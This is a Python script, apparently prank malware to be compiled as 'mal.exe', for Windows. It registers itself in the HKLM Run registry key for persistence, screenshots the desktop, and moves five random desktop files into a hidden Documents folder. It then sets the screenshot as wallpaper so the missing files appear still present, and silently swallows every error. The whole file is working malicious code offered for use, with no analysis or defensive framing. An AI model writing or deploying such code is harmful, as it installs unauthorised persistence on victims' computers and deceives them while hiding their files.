import ctypes
import os
import sys
from win32com import client


try:

	#settings
	minFileCount = 10 #minimum amount of files in the desktop
	hideAmount = 5 #hide count 
	filename = "mal.exe" #currentFilename - change this to before converting to exe

	#required paths 
	path = os.path.join(os.environ["USERPROFILE"],"Desktop");
	documentPath = os.path.join(os.environ["USERPROFILE"],"Documents");

	# #currentFilepath
	currentPath = os.path.join(os.getcwd(),filename);

	# ensure the program runs through startup only
	if(os.getcwd().find("system")==-1):
		shell =client.Dispatch("WScript.Shell");
		shell.RegWrite("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\win32", currentPath,"REG_SZ")
		sys.exit(0)

	#get screenshot
	from mss import mss
	newImage=os.path.join(documentPath,"prankMal","screenshot.png");
	with mss() as sct:
		imagePath=sct.shot(output=newImage)

	#create a directory to copy the files to
	if(not(os.path.isdir(documentPath+"\\prankMal"))):
		os.mkdir(documentPath+"\\prankMal");


	# #get files in desktop
	desktopFiles=[]
	for(dirpath,dirnames,filename) in os.walk(path):
		desktopFiles.extend(filename)
		break;

	# # #filter unwanted files
	filteredFiles =[]
	for file in desktopFiles:
		if(file.startswith("~") or file.endswith(".ini")):
			continue;
		else:
			filteredFiles.append(file);

	totalfiles= len(desktopFiles);

	# #select randomFiles 
	selectedFiles=[]
	if(len(filteredFiles) >=minFileCount):
		from random import randint
		while(len(selectedFiles)!=hideAmount):
			randomPosition = randint(0,len(filteredFiles)-1);
			randomFile=filteredFiles[randomPosition];
			if(randomFile not in selectedFiles):
				selectedFiles.append(randomFile)

	# # move selected files to our prank mal dir
	from shutil import move
	for file in selectedFiles:
		move(os.path.join(path,file),os.path.join(documentPath,"prankMal",file));

	# #change wallpaper to our screenshot
	if(len(selectedFiles)>0):
		ctypes.windll.user32.SystemParametersInfoW(20,0,newImage,0); # sets the wallpaper

except Exception as e:
	pass









































